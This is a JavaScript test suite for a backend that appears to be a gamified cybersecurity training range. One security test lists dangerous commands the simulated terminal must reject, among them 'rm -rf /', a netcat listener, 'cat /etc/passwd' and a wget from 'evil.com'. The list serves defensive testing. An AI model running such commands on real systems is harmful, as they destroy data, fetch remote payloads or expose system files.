import { test, before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import app from '../src/app.js';
import { connectDB, disconnectDB } from '../src/config/db.js';
import { seedInitialData } from '../src/seed/seed.js';
import { User } from '../src/models/User.js';
import { MissionAttempt } from '../src/models/MissionAttempt.js';

describe('NexaRange Command Center Backend Comprehensive Test Suite', () => {
  let operatorToken = null;
  let operatorUser = null;
  let terminalSessionId = null;

  before(async () => {
    process.env.NODE_ENV = 'test';
    await connectDB();
    await seedInitialData();
  });

  after(async () => {
    await disconnectDB();
  });

  // ── 1. Health & 404 ──
  test('GET /api/health should return ok', async () => {
    const res = await request(app).get('/api/health');
    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.status, 'ok');
  });

  test('404 for non-existent endpoint', async () => {
    const res = await request(app).get('/api/non-existent-endpoint');
    assert.equal(res.status, 404);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.code, 'NOT_FOUND');
  });

  // ── 2. Registration ──
  test('POST /api/auth/register should register a new operator', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Alex Hunter',
        email: 'alex.hunter@nexarange.internal',
        callsign: '0xALEX',
        password: 'SecureOperatorPassword2026!',
      });

    assert.equal(res.status, 201);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.token);
    assert.equal(res.body.data.user.name, 'Alex Hunter');
    assert.equal(res.body.data.user.callsign, '0xALEX');
    // Security check: passwordHash must NOT be exposed
    assert.equal(res.body.data.user.passwordHash, undefined);
    assert.equal(res.body.data.user.password, undefined);

    operatorToken = res.body.data.token;
    operatorUser = res.body.data.user;
  });

  test('POST /api/auth/register should reject duplicate email', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Duplicate Alex',
        email: 'alex.hunter@nexarange.internal',
        password: 'AnotherPassword123!',
      });

    assert.equal(res.status, 409);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.code, 'DUPLICATE_KEY');
  });

  test('POST /api/auth/register validation error for invalid email', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Invalid Email User',
        email: 'not-an-email',
        password: 'ValidPassword123!',
      });

    assert.equal(res.status, 400);
    assert.equal(res.body.success, false);
    assert.match(res.body.error.message, /valid email address/i);
  });

  // ── Authentication Scenario Requirements (Req 25) ──
  test('POST /api/auth/register should allow multiple users with same display name (Naveen) but unique username/email', async () => {
    // User 1: Naveen Kumar
    const res1 = await request(app)
      .post('/api/auth/register')
      .send({
        fullName: 'Naveen Kumar',
        username: 'naveen01',
        email: 'naveen01@gmail.com',
        password: 'TestPassword123!',
        role: 'Fresher / Trainee',
      });

    assert.equal(res1.status, 201);
    assert.equal(res1.body.success, true);
    assert.equal(res1.body.data.user.name, 'Naveen Kumar');
    assert.equal(res1.body.data.user.username, 'naveen01');
    assert.equal(res1.body.data.user.email, 'naveen01@gmail.com');
    assert.equal(res1.body.data.user.avatar, 'NK');
    assert.equal(res1.body.data.user.role, 'Fresher / Trainee');

    // User 2: Naveen Sharma (same first name / similar display name — MUST SUCCEED)
    const res2 = await request(app)
      .post('/api/auth/register')
      .send({
        fullName: 'Naveen Sharma',
        username: 'naveen02',
        email: 'naveen02@gmail.com',
        password: 'TestPassword123!',
        role: 'Fresher / Trainee',
      });

    assert.equal(res2.status, 201);
    assert.equal(res2.body.success, true);
    assert.equal(res2.body.data.user.name, 'Naveen Sharma');
    assert.equal(res2.body.data.user.username, 'naveen02');
    assert.equal(res2.body.data.user.email, 'naveen02@gmail.com');
    assert.equal(res2.body.data.user.avatar, 'NS');
  });

  test('POST /api/auth/register should reject duplicate username with precise error message', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        fullName: 'Another Person',
        username: 'naveen01',
        email: 'another@gmail.com',
        password: 'TestPassword123!',
      });

    assert.equal(res.status, 409);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.message, 'Username already exists. Please choose another username.');
  });

  test('POST /api/auth/register should reject duplicate email with precise error message (case-insensitive)', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        fullName: 'Different Person',
        username: 'anotheruser',
        email: 'NAVEEN01@GMAIL.COM', // Uppercase should match lowercase in DB
        password: 'TestPassword123!',
      });

    assert.equal(res.status, 409);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.message, 'An account with this email already exists.');
  });

  test('POST /api/auth/register should reject when both username and email already exist', async () => {
    const res = await request(app)
      .post('/api/auth/register')
      .send({
        fullName: 'Naveen Duplicate',
        username: 'naveen01',
        email: 'naveen01@gmail.com',
        password: 'TestPassword123!',
      });

    assert.equal(res.status, 409);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.message, 'An account with this username and email already exists.');
  });

  test('POST /api/auth/login should authenticate by username', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: 'naveen01',
        password: 'TestPassword123!',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.user.username, 'naveen01');
    assert.equal(res.body.data.user.name, 'Naveen Kumar');
  });

  test('POST /api/auth/login should authenticate by email', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: 'naveen02@gmail.com',
        password: 'TestPassword123!',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.user.username, 'naveen02');
    assert.equal(res.body.data.user.name, 'Naveen Sharma');
  });

  // ── 3. Login ──
  test('POST /api/auth/login should authenticate registered operator', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: 'alex.hunter@nexarange.internal',
        password: 'SecureOperatorPassword2026!',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.token);
    assert.equal(res.body.data.user.email, 'alex.hunter@nexarange.internal');
    // Ensure no password hash is returned
    assert.equal(res.body.data.user.passwordHash, undefined);
  });

  test('POST /api/auth/login should authenticate by callsign', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: '0xALEX',
        password: 'SecureOperatorPassword2026!',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
  });

  test('POST /api/auth/login should reject invalid password', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: 'alex.hunter@nexarange.internal',
        password: 'WrongPassword!',
      });

    assert.equal(res.status, 401);
    assert.equal(res.body.success, false);
  });

  test('POST /api/auth/login should reject non-existent user', async () => {
    const res = await request(app)
      .post('/api/auth/login')
      .send({
        identifier: 'ghost@nexarange.internal',
        password: 'SomePassword123!',
      });

    assert.equal(res.status, 401);
    assert.equal(res.body.success, false);
  });

  // ── 4. Current User & Protected Route ──
  test('GET /api/auth/me should return current authenticated user', async () => {
    const res = await request(app)
      .get('/api/auth/me')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.user.email, 'alex.hunter@nexarange.internal');
    assert.equal(res.body.data.user.level, 1);
  });

  test('Protected routes should reject requests without token', async () => {
    const res = await request(app).get('/api/auth/me');
    assert.equal(res.status, 401);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.code, 'UNAUTHORIZED');
  });

  test('Protected routes should reject malformed or fake token', async () => {
    const res = await request(app)
      .get('/api/auth/me')
      .set('Authorization', 'Bearer fake_invalid_jwt_token_123');

    assert.equal(res.status, 401);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.code, 'INVALID_TOKEN');
  });

  // ── 5. User Profile & Theme Settings ──
  test('GET /api/user/profile should return user profile', async () => {
    const res = await request(app)
      .get('/api/user/profile')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.name, 'Alex Hunter');
  });

  test('PATCH /api/user/settings should update theme preference to light', async () => {
    const res = await request(app)
      .patch('/api/user/settings')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ themePreference: 'light' });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.themePreference, 'light');
  });

  test('PATCH /api/user/settings should update theme preference to system', async () => {
    const res = await request(app)
      .patch('/api/user/settings')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ themePreference: 'system' });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.themePreference, 'system');
  });

  test('PATCH /api/user/settings should reject invalid theme preference', async () => {
    const res = await request(app)
      .patch('/api/user/settings')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ themePreference: 'neon-cyberpunk' });

    assert.equal(res.status, 400);
    assert.equal(res.body.success, false);
  });

  // ── 6. Dashboard Aggregation ──
  test('GET /api/dashboard should return aggregated dashboard metrics', async () => {
    const res = await request(app)
      .get('/api/dashboard')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.xp, 0);
    assert.equal(res.body.data.missionsCompleted, 0);
    assert.equal(res.body.data.missionsTotal, 10);
    assert.equal(res.body.data.securityPosture, 'DEFCON 4 · GUARDED');
    assert.ok(res.body.data.activeMission);
  });

  // ── 7. Missions & Idempotency / Duplicate XP Prevention ──
  test('GET /api/missions should return all 10 operational missions', async () => {
    const res = await request(app)
      .get('/api/missions')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.missions.length, 10);
  });

  test('POST /api/missions/:id/start should initiate mission attempt', async () => {
    const res = await request(app)
      .post('/api/missions/m1_1/start')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.attempt.status, 'in_progress');
  });

  test('POST /api/missions/:id/complete should award XP on first completion', async () => {
    const res = await request(app)
      .post('/api/missions/m1_1/complete')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ tasks: ['Task 1', 'Task 2'] });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.alreadyCompleted, false);
    assert.equal(res.body.data.xpAwarded, 100);
    assert.equal(res.body.data.totalXp, 100);
    assert.equal(res.body.data.badge.name, 'Identity Hunter');
  });

  test('POST /api/missions/:id/complete MUST PREVENT DUPLICATE XP on second call (Idempotency)', async () => {
    const res = await request(app)
      .post('/api/missions/m1_1/complete')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ tasks: ['Task 1', 'Task 2'] });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.alreadyCompleted, true);
    // CRITICAL: ZERO new XP awarded
    assert.equal(res.body.data.xpAwarded, 0);
    assert.equal(res.body.data.totalXp, 100);
  });

  // ── 8. Labs ──
  test('GET /api/labs should return all 2 labs', async () => {
    const res = await request(app)
      .get('/api/labs')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.labs.length, 2);
  });

  test('POST /api/labs/1/complete should fail if missions are not complete', async () => {
    const res = await request(app)
      .post('/api/labs/1/complete')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 400);
    assert.equal(res.body.success, false);
    assert.equal(res.body.error.code, 'INCOMPLETE_OBJECTIVES');
  });

  // ── 9. Simulated Terminal & Safety Guarantees ──
  test('POST /api/terminal/session should create an active session', async () => {
    const res = await request(app)
      .post('/api/terminal/session')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({ labId: 1 });

    assert.equal(res.status, 201);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.session.sessionId);
    terminalSessionId = res.body.data.session.sessionId;
  });

  test('POST /api/terminal/command should execute whitelisted "help" command', async () => {
    const res = await request(app)
      .post('/api/terminal/command')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({
        sessionId: terminalSessionId,
        command: 'help',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.allowed, true);
    assert.match(res.body.data.output, /NEXARANGE SIMULATION TERMINAL/);
  });

  test('POST /api/terminal/command should execute whitelisted "scan" command', async () => {
    const res = await request(app)
      .post('/api/terminal/command')
      .set('Authorization', `Bearer ${operatorToken}`)
      .send({
        sessionId: terminalSessionId,
        command: 'scan',
      });

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.allowed, true);
    assert.match(res.body.data.output, /INITIATING SIMULATED SUBNET SCAN/);
  });

  // ── 10. CRITICAL SECURITY: Terminal Arbitrary Execution Prohibition ──
  test('SECURITY TEST: Dangerous OS commands MUST BE REJECTED and NEVER executed', async () => {
    const dangerousCommands = [
      'rm -rf /',
      'sudo su',
      'bash -i',
      'sh',
      'python -c "print(1)"',
      'node -e "process.exit()"',
      'curl http://malicious.external.com',
      'wget http://evil.com/payload',
      'nc -lvnp 4444',
      'nmap 192.168.1.1',
      'ping -c 4 8.8.8.8',
      'powershell Get-Process',
      'cmd.exe /c dir',
      'cat /etc/passwd',
      'chmod 777 /',
    ];

    for (const cmd of dangerousCommands) {
      const res = await request(app)
        .post('/api/terminal/command')
        .set('Authorization', `Bearer ${operatorToken}`)
        .send({
          sessionId: terminalSessionId,
          command: cmd,
        });

      assert.equal(res.status, 200);
      assert.equal(res.body.success, true);
      assert.equal(res.body.data.allowed, false, `Command "${cmd}" must NOT be allowed!`);
      assert.match(res.body.data.output, /command not recognized/i);
    }
  });

  test('SECURITY TEST: Unauthorized terminal session access by another user', async () => {
    // Register another user
    const otherRes = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Eve Intruder',
        email: 'eve@nexarange.internal',
        password: 'IntruderPass2026!',
      });

    const otherToken = otherRes.body.data.token;

    // Eve attempts to execute command on Alex's session
    const hackRes = await request(app)
      .post('/api/terminal/command')
      .set('Authorization', `Bearer ${otherToken}`)
      .send({
        sessionId: terminalSessionId,
        command: 'status',
      });

    assert.equal(hackRes.status, 404);
    assert.equal(hackRes.body.success, false);
  });

  // ── 11. Stats & Telemetry ──
  test('GET /api/stats/overview should return live stats', async () => {
    const res = await request(app)
      .get('/api/stats/overview')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.totalXp, 100);
    assert.equal(res.body.data.completedMissionsCount, 1);
  });

  test('GET /api/stats/skills should return skill matrix radar', async () => {
    const res = await request(app)
      .get('/api/stats/skills')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(res.body.data.radarList.length, 6);
  });

  test('GET /api/stats/xp-history should return progression points', async () => {
    const res = await request(app)
      .get('/api/stats/xp-history')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.history.length >= 2); // Baseline + M01
  });

  // ── 12. Rank & Leaderboard ──
  test('GET /api/rank/me should return operator rank', async () => {
    const res = await request(app)
      .get('/api/rank/me')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.rank > 0);
  });

  test('GET /api/rank/leaderboard should return leaderboard with current operator', async () => {
    const res = await request(app)
      .get('/api/rank/leaderboard')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.leaderboard.some((e) => e.isMe));
  });

  // ── 13. Certificates ──
  test('GET /api/certificates should return user certificates (initially empty before all 5)', async () => {
    const res = await request(app)
      .get('/api/certificates')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(Array.isArray(res.body.data.certificates), true);
  });

  // ── 14. Squad & Notifications ──
  test('GET /api/squad should return squad data', async () => {
    const res = await request(app)
      .get('/api/squad')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.ok(res.body.data.friends.length > 0);
  });

  test('GET /api/notifications should return notifications', async () => {
    const res = await request(app)
      .get('/api/notifications')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);
    assert.equal(Array.isArray(res.body.data.notifications), true);
  });

  // ── 15. Progress Reset ──
  test('POST /api/progress/reset should reset user progress to benchmark', async () => {
    const res = await request(app)
      .post('/api/progress/reset')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(res.status, 200);
    assert.equal(res.body.success, true);

    const userCheck = await User.findById(operatorUser.id);
    assert.equal(userCheck.xp, 0);
    assert.equal(userCheck.level, 1);
  });

  // ── 16. Logout & Session Invalidation ──
  test('POST /api/auth/logout should terminate session and invalidate future calls', async () => {
    const logoutRes = await request(app)
      .post('/api/auth/logout')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(logoutRes.status, 200);
    assert.equal(logoutRes.body.success, true);
    assert.equal(logoutRes.body.data.sessionState, 'TERMINATED');

    // Attempting to call protected API with the logged-out token MUST return 401
    const accessRes = await request(app)
      .get('/api/auth/me')
      .set('Authorization', `Bearer ${operatorToken}`);

    assert.equal(accessRes.status, 401);
    assert.equal(accessRes.body.success, false);
    assert.equal(accessRes.body.error.code, 'SESSION_REVOKED');
  });
});
